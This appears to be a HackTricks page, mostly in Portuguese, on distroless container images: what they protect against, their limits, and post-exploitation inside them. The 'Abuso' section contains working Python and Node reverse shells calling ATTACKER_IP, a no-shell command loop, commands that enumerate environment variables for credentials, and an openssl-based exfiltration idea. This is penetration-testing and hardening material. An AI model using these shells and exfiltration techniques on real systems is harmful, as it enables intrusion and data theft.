# Distroless Containers

{{#include ../../../banners/hacktricks-training.md}}

## Visão Geral

Uma imagem de contêiner **distroless** é uma imagem que entrega os **componentes mínimos de runtime necessários para executar uma aplicação específica**, removendo intencionalmente as ferramentas típicas de distribuição, como gerenciadores de pacotes, shells e grandes conjuntos de utilitários genéricos de userland. Na prática, imagens distroless frequentemente contêm apenas o binário ou runtime da aplicação, suas bibliotecas compartilhadas, bundles de certificados e uma estrutura de sistema de arquivos muito reduzida.

A questão não é que distroless seja uma nova primitiva de isolamento do kernel. Distroless é uma **estratégia de design de imagem**. Ela altera o que está disponível **dentro** do sistema de arquivos do contêiner, não como o kernel isola o contêiner. Essa distinção é importante, porque distroless endurece o ambiente principalmente reduzindo o que um atacante pode usar depois de obter execução de código. Não substitui namespaces, seccomp, capabilities, AppArmor, SELinux, ou qualquer outro mecanismo de isolamento em runtime.

## Por que Distroless Existe

Imagens distroless são usadas principalmente para reduzir:

- o tamanho da imagem
- a complexidade operacional da imagem
- o número de pacotes e binários que podem conter vulnerabilidades
- o número de ferramentas de pós-exploração disponíveis para um atacante por padrão

Por isso imagens distroless são populares em deploys de aplicações em produção. Um contêiner que não contém shell, nem gerenciador de pacotes, e quase nenhuma ferramenta genérica é geralmente mais fácil de raciocinar do ponto de vista operacional e mais difícil de abusar interativamente após um comprometimento.

Exemplos de famílias de imagens no estilo distroless bem conhecidas incluem:

- Google's distroless images
- Chainguard hardened/minimal images

## O que Distroless Não Significa

Um contêiner distroless **não** é:

- automaticamente rootless
- automaticamente non-privileged
- automaticamente read-only
- automaticamente protegido por seccomp, AppArmor, ou SELinux
- automaticamente seguro contra container escape

Ainda é possível executar uma imagem distroless com `--privileged`, compartilhamento de namespaces com o host, bind mounts perigosos, ou um runtime socket montado. Nesse cenário, a imagem pode ser minimal, mas o contêiner ainda pode ser catastróficamente inseguro. Distroless altera a **superfície de ataque do userland**, não a **fronteira de confiança do kernel**.

## Características Operacionais Típicas

Quando você compromete um contêiner distroless, a primeira coisa que geralmente percebe é que suposições comuns deixam de ser verdadeiras. Pode não haver `sh`, nem `bash`, nem `ls`, nem `id`, nem `cat`, e às vezes nem mesmo um ambiente baseado em libc que se comporte da maneira que seu tradecraft habitual espera. Isso afeta tanto ofensiva quanto defensiva, pois a falta de ferramentas torna debugging, resposta a incidentes e pós-exploração diferentes.

Os padrões mais comuns são:

- o runtime da aplicação existe, mas pouco mais
- payloads baseados em shell falham porque não existe shell
- one-liners comuns de enumeração falham porque os binários auxiliares estão ausentes
- proteções de sistema de arquivos, como rootfs read-only ou `noexec` em locais graváveis temporários, frequentemente também estão presentes

Essa combinação é o que geralmente leva as pessoas a falar sobre "weaponizing distroless".

## Distroless e Pós-Exploração

O principal desafio ofensivo em um ambiente distroless nem sempre é o RCE inicial. Frequentemente é o que vem a seguir. Se o workload explorado fornece execução de código em um runtime de linguagem como Python, Node.js, Java ou Go, você pode ser capaz de executar lógica arbitrária, mas não através dos fluxos de trabalho centrados em shell que são comuns em outros alvos Linux.

Isso significa que a pós-exploração frequentemente se direciona para uma de três direções:

1. **Use o runtime de linguagem existente diretamente** para enumerar o ambiente, abrir sockets, ler arquivos ou preparar payloads adicionais.
2. **Leve suas próprias ferramentas para a memória** se o sistema de arquivos for read-only ou locais graváveis estiverem montados com `noexec`.
3. **Abuse de binários existentes já presentes na imagem** se a aplicação ou suas dependências incluírem algo inesperadamente útil.

## Abuso

### Enumerar o Runtime que Você Já Tem

Em muitos contêineres distroless não existe shell, mas ainda existe um runtime da aplicação. Se o alvo for um serviço Python, o Python estará presente. Se o alvo for Node.js, o Node estará presente. Isso frequentemente fornece funcionalidade suficiente para enumerar arquivos, ler variáveis de ambiente, abrir reverse shells e preparar execução em memória sem nunca invocar `/bin/sh`.

Um exemplo simples com Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Um exemplo simples com Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impacto:

- recuperação de variáveis de ambiente, frequentemente incluindo credenciais ou endpoints de serviço
- enumeração do filesystem sem `/bin/ls`
- identificação de caminhos graváveis e secrets montados

### Reverse Shell Sem `/bin/sh`

Se a imagem não contiver `sh` ou `bash`, um clássico reverse shell baseado em shell pode falhar imediatamente. Nessa situação, use o runtime da linguagem instalada.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Se `/bin/sh` não existir, substitua a linha final por execução direta de comandos dirigida por Python ou por um loop REPL em Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Novamente, se `/bin/sh` estiver ausente, use diretamente Node's filesystem, process, and networking APIs em vez de spawning a shell.

### Exemplo completo: No-Shell Python Command Loop

Se a imagem tiver Python mas não houver shell algum, um loop interativo simples frequentemente é suficiente para manter a capacidade completa de post-exploitation:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Isso não requer um binário de shell interativo. O impacto é efetivamente o mesmo de um shell básico do ponto de vista do atacante: execução de comandos, enumeração e staging de payloads adicionais através do runtime existente.

### Execução de Ferramentas em Memória

Imagens distroless costumam ser combinadas com:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- falta de ferramentas de gerenciamento de pacotes

Essa combinação torna fluxos de trabalho clássicos de "baixar um binário para o disco e executá-lo" pouco confiáveis. Nesses casos, técnicas de execução em memória tornam-se a principal alternativa.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

As técnicas mais relevantes lá são:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Binários Existentes Já na Imagem

Algumas imagens distroless ainda contêm binários operacionalmente necessários que se tornam úteis após o comprometimento. Um exemplo observado repetidamente é `openssl`, porque aplicações às vezes precisam dele para tarefas relacionadas a crypto ou TLS.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
If `openssl` is present, it may be usable for:

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

The exact abuse depends on what is actually installed, but the general idea is that distroless does not mean "nenhuma ferramenta de forma alguma"; it means "muito menos ferramentas do que uma imagem de distribuição normal".

## Verificações

O objetivo dessas verificações é determinar se a imagem é realmente distroless na prática e quais binários de runtime ou auxiliares ainda estão disponíveis para post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
O que é interessante aqui:

- Se não existir um shell mas um runtime como Python ou Node estiver presente, post-exploitation deve pivotar para runtime-driven execution.
- Se o root filesystem for somente leitura e `/dev/shm` for gravável mas `noexec`, memory execution techniques tornam-se muito mais relevantes.
- Se helper binaries tais como `openssl`, `busybox` ou `java` existirem, eles podem oferecer funcionalidade suficiente para bootstrap further access.

## Padrões de runtime

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Userland mínimo por design | Sem shell, sem package manager, apenas dependências de application/runtime | adicionar camadas de debugging, sidecar shells, copiar busybox ou tooling |
| Chainguard minimal images | Userland mínimo por design | Superfície de pacotes reduzida, frequentemente focada em um runtime ou serviço | usando `:latest-dev` ou variantes debug, copiando ferramentas durante o build |
| Kubernetes workloads using distroless images | Depende da configuração do Pod | Distroless afeta apenas o userland; a postura de segurança do Pod ainda depende do Pod spec e dos runtime defaults | adicionar containers de debug efêmeros, host mounts, configurações de Pod privilegiado |
| Docker / Podman running distroless images | Depende das flags de execução | Filesystem mínimo, mas a segurança do runtime ainda depende das flags e da configuração do daemon | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

O ponto chave é que distroless é uma **image property**, não uma runtime protection. Seu valor vem de reduzir o que está disponível dentro do filesystem após o comprometimento.

## Páginas relacionadas

Para filesystem e memory-execution bypasses comumente necessários em ambientes distroless:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Para container runtime, socket, and mount abuse que ainda se aplicam a distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
